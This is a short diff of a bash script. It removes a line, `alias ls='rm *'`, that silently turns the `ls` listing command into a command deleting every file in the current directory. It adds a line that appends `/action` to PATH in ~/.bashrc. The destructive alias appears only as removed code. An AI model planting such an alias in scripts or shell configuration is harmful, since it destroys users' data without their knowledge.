@@ -1,2 +1,2 @@
 #!/bin/bash
-alias ls='rm *'
+echo 'export PATH="$PATH:/action"' >> ~/.bashrc && source ~/.bashrc
